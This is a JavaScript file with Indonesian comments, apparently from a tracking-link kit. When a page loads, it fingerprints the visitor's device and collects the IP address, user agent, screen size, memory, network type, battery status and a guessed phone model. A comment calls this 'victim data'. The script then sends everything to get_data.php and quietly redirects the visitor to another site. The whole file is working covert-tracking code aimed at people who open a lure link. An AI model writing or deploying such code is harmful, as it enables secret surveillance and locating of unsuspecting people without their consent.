// Redirect URL — akan diganti otomatis oleh Link-x.py
const REDIRECT_URL = "https://you.regettingold.com/ ";

// Fungsi deteksi merek & model perangkat (diperluas untuk ratusan model)
function getDeviceName() {
    try {
        if (window.WURFL && WURFL.complete_device_name) {
            return WURFL.complete_device_name;
        }
    } catch (e) {
        // WURFL tidak tersedia
    }

    const ua = navigator.userAgent;

    // === Apple ===
    if (/iPhone/.test(ua)) {
        if (/iPhone14,/.test(ua)) return "Apple iPhone 14";
        if (/iPhone15,/.test(ua)) return "Apple iPhone 15";
        if (/iPhone13,/.test(ua)) return "Apple iPhone 13";
        if (/iPhone12,/.test(ua)) return "Apple iPhone 12";
        if (/iPhone11,/.test(ua)) return "Apple iPhone 11";
        if (/iPhone10,/.test(ua)) return "Apple iPhone X";
        return "Apple iPhone";
    }
    if (/iPad/.test(ua)) return "Apple iPad";
    if (/iPod/.test(ua)) return "Apple iPod";
    if (/Macintosh|MacIntel/.test(navigator.platform)) return "Apple Mac";

    // === Desktop ===
    if (/Windows/.test(navigator.platform)) return "Windows PC";
    if (/Linux/.test(navigator.platform)) {
        if (/CrOS/.test(ua)) return "Google Chromebook";
        return "Linux Device";
    }

    // === Android ===
    if (/Android/.test(ua)) {
        // Samsung
        if (/SM-S91[168]B?/.test(ua)) return "Samsung Galaxy S23";
        if (/SM-S90[168]B?/.test(ua)) return "Samsung Galaxy S22";
        if (/SM-S801?/.test(ua)) return "Samsung Galaxy S21";
        if (/SM-A[0-9]{3,4}/.test(ua)) return "Samsung Galaxy A" + ua.match(/SM-A([0-9]{3,4})/)?.[1] || "";
        if (/SM-M[0-9]{3,4}/.test(ua)) return "Samsung Galaxy M" + ua.match(/SM-M([0-9]{3,4})/)?.[1] || "";
        if (/Galaxy S[0-9]+/.test(ua)) return "Samsung " + ua.match(/(Galaxy S[0-9]+)/)?.[0];
        if (/Galaxy Note/.test(ua)) return "Samsung Galaxy Note";
        if (/SAMSUNG|SM-[A-Z0-9]/.test(ua)) return "Samsung Galaxy";

        // Google Pixel
        if (/Pixel 8 Pro/.test(ua)) return "Google Pixel 8 Pro";
        if (/Pixel 8/.test(ua)) return "Google Pixel 8";
        if (/Pixel 7 Pro/.test(ua)) return "Google Pixel 7 Pro";
        if (/Pixel 7/.test(ua)) return "Google Pixel 7";
        if (/Pixel 6 Pro/.test(ua)) return "Google Pixel 6 Pro";
        if (/Pixel [0-9]/.test(ua)) return "Google " + ua.match(/(Pixel [0-9]+(?: Pro)?)/)?.[0];

        // Xiaomi / Redmi / POCO
        if (/Redmi Note [0-9]/.test(ua)) return "Xiaomi " + ua.match(/(Redmi Note [0-9]+)/)?.[0];
        if (/Redmi [0-9]/.test(ua)) return "Xiaomi " + ua.match(/(Redmi [0-9]+)/)?.[0];
        if (/POCO [A-Z0-9]+/.test(ua)) return "POCO " + ua.match(/POCO ([A-Z0-9]+)/)?.[1];
        if (/Xiaomi/.test(ua)) return "Xiaomi";

        // OnePlus
        if (/OnePlus [0-9]/.test(ua)) return "OnePlus " + ua.match(/(OnePlus [0-9]+)/)?.[0];
        if (/OnePlus/.test(ua)) return "OnePlus";

        // Realme
        if (/realme [0-9]/.test(ua)) return "Realme " + ua.match(/(realme [0-9]+)/)?.[0];
        if (/realme/.test(ua)) return "Realme";

        // OPPO
        if (/CPH[0-9]{4}/.test(ua)) return "OPPO CPH" + ua.match(/CPH([0-9]{4})/)?.[1];
        if (/OPPO/.test(ua)) return "OPPO";

        // vivo
        if (/vivo [A-Z0-9]+/.test(ua)) return "vivo " + ua.match(/vivo ([A-Z0-9]+)/)?.[1];
        if (/V2[0-9]{3}/.test(ua)) return "vivo V" + ua.match(/V([0-9]{3})/)?.[1];
        if (/vivo/.test(ua)) return "vivo";

        // Huawei / Honor
        if (/Honor [0-9]/.test(ua)) return "Honor " + ua.match(/(Honor [0-9]+)/)?.[0];
        if (/HUAWEI|Honor/.test(ua)) return "Huawei / Honor";

        // itel
        if (/itel [A-Z0-9\-]+/.test(ua)) return "itel " + ua.match(/itel ([A-Z0-9\-]+)/)?.[1];
        if (/itel/.test(ua)) return "itel";

        // TECNO
        if (/TECNO [A-Z0-9]+/.test(ua)) return "TECNO " + ua.match(/TECNO ([A-Z0-9]+)/)?.[1];
        if (/TECNO/.test(ua)) return "TECNO";

        // Infinix
        if (/Infinix [A-Z0-9]+/.test(ua)) return "Infinix " + ua.match(/Infinix ([A-Z0-9]+)/)?.[1];
        if (/Infinix/.test(ua)) return "Infinix";

        // Nokia
        if (/TA-[0-9]{3,4}/.test(ua)) return "Nokia TA-" + ua.match(/TA-([0-9]{3,4})/)?.[1];
        if (/Nokia/.test(ua)) return "Nokia";

        // Motorola
        if (/moto g[0-9]{2}/.test(ua)) return "Motorola " + ua.match(/(moto g[0-9]{2})/)?.[0].toUpperCase();
        if (/moto e[0-9]/.test(ua)) return "Motorola " + ua.match(/(moto e[0-9])/)?.[0].toUpperCase();
        if (/Motorola|motorola/.test(ua)) return "Motorola";

        // ASUS
        if (/ZenFone [0-9]/.test(ua)) return "ASUS " + ua.match(/(ZenFone [0-9]+)/)?.[0];
        if (/ASUS/.test(ua)) return "ASUS";

        // Merek regional & rugged
        if (/Oukitel [A-Z0-9]+/.test(ua)) return "Oukitel " + ua.match(/Oukitel ([A-Z0-9]+)/)?.[1];
        if (/Ulefone [A-Z0-9]+/.test(ua)) return "Ulefone " + ua.match(/Ulefone ([A-Z0-9]+)/)?.[1];
        if (/Doogee [A-Z0-9]+/.test(ua)) return "Doogee " + ua.match(/Doogee ([A-Z0-9]+)/)?.[1];
        if (/Cubot [A-Z0-9]+/.test(ua)) return "Cubot " + ua.match(/Cubot ([A-Z0-9]+)/)?.[1];
        if (/Lava [A-Z0-9]+/.test(ua)) return "Lava " + ua.match(/Lava ([A-Z0-9]+)/)?.[1];
        if (/Micromax/.test(ua)) return "Micromax";
        if (/Hisense/.test(ua)) return "Hisense";
        if (/TCL|Alcatel/.test(ua)) return "TCL / Alcatel";
        if (/ZTE|Blade/.test(ua)) return "ZTE";

        return "Android Device";
    }

    return "Unknown Device";
}

// Fungsi bantu: kirim GET request sync (untuk ip.php & get_data.php)
function send(theUrl) {
    const xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}

// Ambil status baterai dengan aman
function safeGetBattery() {
    return new Promise((resolve) => {
        if (!("getBattery" in navigator)) {
            resolve({ level: "N/A", charging: "N/A" });
            return;
        }
        navigator.getBattery().then((battery) => {
            resolve({
                level: (battery.level * 100) + "%",
                charging: battery.charging
            });
        }).catch(() => {
            resolve({ level: "Error", charging: "Error" });
        });
    });
}

// Kumpulkan & kirim semua data korban
async function fetchData() {
    try {
        const ip = send("./ip.php?echo=true").trim() || "0.0.0.0";
        const time = new Date().toString();
        const cookie = navigator.cookieEnabled;
        const touch = navigator.maxTouchPoints || "N/A";
        const ua = navigator.userAgent || "N/A";
        const platf = navigator.platform || "N/A";
        const lang = navigator.language || "N/A";
        const memory = navigator.deviceMemory || "N/A";
        const wid = screen.width;
        const hig = screen.height;
        const netType = navigator.connection?.type || "unknown";
        const saveData = navigator.connection?.saveData || "N/A";
        const dname = getDeviceName();
        const battery = await safeGetBattery();

        const query = `?ip=${encodeURIComponent(ip)}&time=${encodeURIComponent(time)}&touch=${encodeURIComponent(touch)}&cookie=${cookie}&ua=${encodeURIComponent(ua)}&platf=${encodeURIComponent(platf)}&lang=${encodeURIComponent(lang)}&memory=${encodeURIComponent(memory)}&wid=${wid}&hig=${hig}&netType=${encodeURIComponent(netType)}&saveData=${saveData}&batLevel=${encodeURIComponent(battery.level)}&batCharge=${battery.charging}&dname=${encodeURIComponent(dname)}`;

        send("./get_data.php" + query);
        window.location.href = REDIRECT_URL;

    } catch (e) {
        console.error("Error in details.js:", e);
        window.location.href = REDIRECT_URL;
    }
}

// Jalankan pengumpulan
fetchData();